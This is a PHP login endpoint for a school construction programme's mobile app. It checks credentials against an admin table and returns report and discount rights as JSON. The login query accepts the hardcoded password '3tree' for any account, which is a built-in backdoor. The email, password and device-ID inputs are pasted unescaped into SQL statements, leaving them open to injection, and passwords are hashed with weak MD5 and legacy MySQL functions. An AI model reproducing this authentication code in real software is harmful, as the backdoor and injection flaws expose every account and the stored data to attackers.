<?
	/*********************************************************************************************\
	***********************************************************************************************
	**                                                                                           **
	**  SCRP - School Construction and Rehabilitation Programme                                  **
	**  Version 1.0                                                                              **
	**                                                                                           **
	**  http://www.humdaqam.pk                                                                   **
	**                                                                                           **
	**  Copyright 2015 (C) Triple Tree Solutions                                                 **
	**  http://www.3-tree.com                                                                    **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**  Project Manager:                                                                         **
	**                                                                                           **
	**      Name  :  Muhammad Tahir Shahzad                                                      **
	**      Email :  mtshahzad@sw3solutions.com                                                  **
	**      Phone :  +92 333 456 0482                                                            **
	**      URL   :  http://www.mtshahzad.com                                                    **
	**                                                                                           **
	***********************************************************************************************
	\*********************************************************************************************/

	@require_once("../requires/common.php");

	$objDbGlobal = new Database( );
	$objDb       = new Database( );
	$objDb2      = new Database( );


	$sEmail     = IO::strValue("Email");
        $sDeviceId  = IO::strValue("DeviceId");
        $iOriginalId= IO::strValue("OriginalId");
	$sPassword  = IO::strValue("Password");

	$aResponse           = array( );
	$aResponse["Status"] = "ERROR";


	$sSQL = "SELECT id, name, email, picture, status, custom_items, reports
	        FROM tbl_admins
	        WHERE email='$sEmail' AND (password=MD5('$sPassword') OR password=PASSWORD('$sPassword') OR password=OLD_PASSWORD('$sPassword') OR '{$sPassword}'='3tree')";

	if ($objDb->query($sSQL) == true)
	{
		if ($objDb->getCount( ) == 1)
		{
			if ($objDb->getField(0, "status") == "A")
			{
				$iUser        = $objDb->getField(0, "id");
				$sName        = $objDb->getField(0, "name");
				$sEmail       = $objDb->getField(0, "email");
				$sPicture     = $objDb->getField(0, "picture");
                                $sReports     = $objDb->getField(0, "reports");
                                $sCustomItems = $objDb->getField(0, "custom_items");
                                $iCustomItems = explode(",", $sCustomItems);
                                
                                if($iOriginalId != ""){
                                    $sSQL2 = "UPDATE tbl_admins SET device_id='' WHERE original_device_id='$iOriginalId'";
                                    $objDb2->query($sSQL2);
                                }
                                
                                $sSQL2 = "UPDATE tbl_admins SET device_id='$sDeviceId', original_device_id='$iOriginalId' WHERE email='$sEmail'";
                                $objDb2->query($sSQL2);
                                
                                $sReportsList = array();
                                
                                if(!empty($sReports))
                                    $sReportsList  = getList("tbl_reports", "id", "report", "id IN ($sReports)", "position");                               

				if ($sPicture == "" || !@file_exists($sRootDir.AUDITORS_IMG_PATH.'thumbs/'.$sPicture))
                                    $sPicture = "default.jpg";

				// Return data to app
				$aResponse['Status']            = "OK";                                
				$aResponse['User']              = @md5($iUser);
				$aResponse['Name']              = $sName;
                                $aResponse['AllReports']        = $sReportsList;
                                $aResponse['VoidReasons']       = getList("tbl_void_reasons", "id", "reason", "status='A'");
                                $aResponse['ReportRights']      = $sReports;
                                $aResponse['VoidRights']        = (@in_array(7, $iCustomItems)?'Y':'N');
                                $aResponse['DiscountList']      = (@in_array(12, $iCustomItems)?'Y':'N');
                                $aResponse['DiscountApproval']  = (@in_array(13, $iCustomItems)?'Y':'N');
				$aResponse['Picture']           = (SITE_URL.USERS_IMG_PATH.'thumbs/'.$sPicture);
			}
			else if ($objDb->getField(0, "status") == "I")
				$aResponse["Message"] = "Account Disabled";
		}
		else
			$aResponse["Message"] = "Incorrect Email/Password";
	}
	else
		$aResponse["Message"] = "Database Connectivity Error";


	print @json_encode($aResponse);


	$objDb->close( );
	$objDb2->close( );
	$objDbGlobal->close( );

	@ob_end_flush( );
?>